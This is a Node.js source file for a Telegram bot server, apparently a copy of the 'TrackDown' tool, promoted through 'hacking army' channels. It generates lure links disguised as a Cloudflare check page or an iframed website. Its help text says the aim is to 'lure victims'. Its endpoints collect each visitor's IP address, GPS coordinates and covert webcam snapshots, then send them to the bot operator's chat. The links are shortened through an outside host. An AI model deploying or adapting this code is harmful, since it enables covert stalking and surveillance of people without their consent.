const fs = require("fs");
const express = require("express");
var cors = require('cors');
var bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(process.env["bot"], {polling: true});
var jsonParser = bodyParser.json({limit: 1024*1024*20, type: 'application/json'});
var urlencodedParser = bodyParser.urlencoded({ extended: true, limit: 1024*1024*20, type: 'application/x-www-form-urlencoded' });
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

const channelUsername1 = '@RenusHackingArmy';
const channelUsername2 = '@RenusBotsChannel';

const joinChannel1Button = {
  text: '𝙅𝙊𝙄𝙉 𝘾𝙃𝘼𝙉𝙉𝙀𝙇👻',
  url: 'https://t.me/RenusHackingArmy'
};

const joinChannel2Button = {
  text: '𝗝𝗢𝗜𝗡 𝗚𝗥𝗢𝗨𝗣🚁',
  url: 'https://t.me/RenusBotsChannel'
};

// Create a button with the URL
const contactUsButton = {
  text: '𝘾𝙊𝙉𝙏𝘼𝘾𝙏 𝙈𝙀📞',
  url: 'https://t.me/RenusRobot'
};

const checkJoinedButton = {
  text: '𝗝𝗢𝗜𝗡𝗘𝗗👽',
  callback_data: 'start_command'
};

// Modify your URL here
var hostURL = "https://trackdown-k1l1.onrender.com";
// TOGGLE for 1pt Proxy and Shorters
var use1pt = true;

app.get("/w/:path/:uri", (req, res) => {
  var ip;
  var d = new Date();
  d = d.toJSON().slice(0, 19).replace('T', ':');
  if (req.headers['x-forwarded-for']) {
    ip = req.headers['x-forwarded-for'].split(",")[0];
  } else if (req.connection && req.connection.remoteAddress) {
    ip = req.connection.remoteAddress;
  } else {
    ip = req.ip;
  }

  if (req.params.path != null) {
    res.render("webview", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
  } else {
    res.redirect("https://t.me/th30neand0nly0ne");
  }
});

app.get("/c/:path/:uri", (req, res) => {
  var ip;
  var d = new Date();
  d = d.toJSON().slice(0, 19).replace('T', ':');
  if (req.headers['x-forwarded-for']) {
    ip = req.headers['x-forwarded-for'].split(",")[0];
  } else if (req.connection && req.connection.remoteAddress) {
    ip = req.connection.remoteAddress;
  } else {
    ip = req.ip;
  }

  if (req.params.path != null) {
    res.render("cloudflare", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
  } else {
    res.redirect("https://t.me/th30neand0nly0ne");
  }
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg?.reply_to_message?.text == "🌐 Enter Your URL") {
    createLink(chatId, msg.text);
  }

  if (msg.text == "/start") {
    startCommand(chatId);
  } else if (msg.text == "/create") {
    createNew(chatId);
  } else if (msg.text == "/help") {
    bot.sendMessage(chatId, `Through this bot you can track people just by sending a simple link.\n\nSend /create to begin, afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving the URL, it will send you 2 links which you can use to track people.\n\nSpecifications:\n1. Cloudflare Link: This method will show a Cloudflare under attack page to gather information and afterwards victim will be redirected to the destination URL.\n2. Webview Link: This will show a website (e.g., Bing, dating sites, etc.) using iframe for gathering information. (⚠️ Many sites may not work under this method if they have x-frame header present, e.g., https://google.com)\n\nThe project is OSS at: https://github.com/Th30neAnd0nly/TrackDown`);
  }
});

bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
  bot.answerCallbackQuery(callbackQuery.id);
  if (callbackQuery.data == "crenew") {
    createNew(callbackQuery.message.chat.id);
  }
});

bot.on('polling_error', (error) => {
  console.log(error.code); 
});

async function createLink(cid, msg) {
  var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

  if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1) && !encoded) {
    var url = cid.toString(36) + '/' + Buffer.from(msg).toString('base64');
    var m = {
      reply_markup: JSON.stringify({
        "inline_keyboard": [{ text: "Create new Link", callback_data: "crenew" }]
      })
    };

    var cUrl = `${hostURL}/c/${url}`;
    var wUrl = `${hostURL}/w/${url}`;

    bot.sendChatAction(cid, "typing");
    if (use1pt) {
      var x = await fetch(`https://claim-event.co/short-url.php?url=${encodeURIComponent(cUrl)}`).then(res => res.json());
      var y = await fetch(`https://claim-event.co/short-url.php?url=${encodeURIComponent(wUrl)}`).then(res => res.json());

      var f = "", g = "";

      for (var c in x) {
        f += x[c] + "\n";
      }

      for (var c in y) {
        g += y[c] + "\n";
      }

      bot.sendMessage(cid, `New links have been created successfully. You can use any one of the below links.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`, m);
    } else {
      bot.sendMessage(cid, `New links have been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`, m);
    }
  } else {
    bot.sendMessage(cid, `⚠️ Please enter a valid URL, including http or https.`);
    createNew(cid);
  }
}

function createNew(cid) {
  var mk = {
    reply_markup: JSON.stringify({ "force_reply": true })
  };
  bot.sendMessage(cid, `🌐 Enter Your URL`, mk);
}

app.get("/", (req, res) => {
  var ip;
  if (req.headers['x-forwarded-for']) {
    ip = req.headers['x-forwarded-for'].split(",")[0];
  } else if (req.connection && req.connection.remoteAddress) {
    ip = req.connection.remoteAddress;
  } else {
    ip = req.ip;
  }
  res.json({ "ip": ip });
});

app.post("/location", (req, res) => {
  var lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
  var lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
  var uid = decodeURIComponent(req.body.uid) || null;
  var acc = decodeURIComponent(req.body.acc) || null;
  if (lon != null && lat != null && uid != null && acc != null) {
    bot.sendLocation(parseInt(uid, 36), lat, lon);
    bot.sendMessage(parseInt(uid, 36), `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
    res.send("Done");
  }
});

app.post("/", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var data = decodeURIComponent(req.body.data) || null;
  if (uid != null && data != null) {
    data = data.replace(/<br>/g, "\n");
    bot.sendMessage(parseInt(uid, 36), data, { parse_mode: "HTML" });
    res.send("Done");
  }
});

app.post("/camsnap", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var img = decodeURIComponent(req.body.img) || null;

  if (uid != null && img != null) {
    var buffer = Buffer.from(img, 'base64');

    var info = {
      filename: "camsnap.png",
      contentType: 'image/png'
    };

    try {
      bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
    } catch (error) {
      console.log(error);
    }

    res.send("Done");
  }
});

app.listen(5000, () => {
  console.log("App Running on Port 5000!");
});
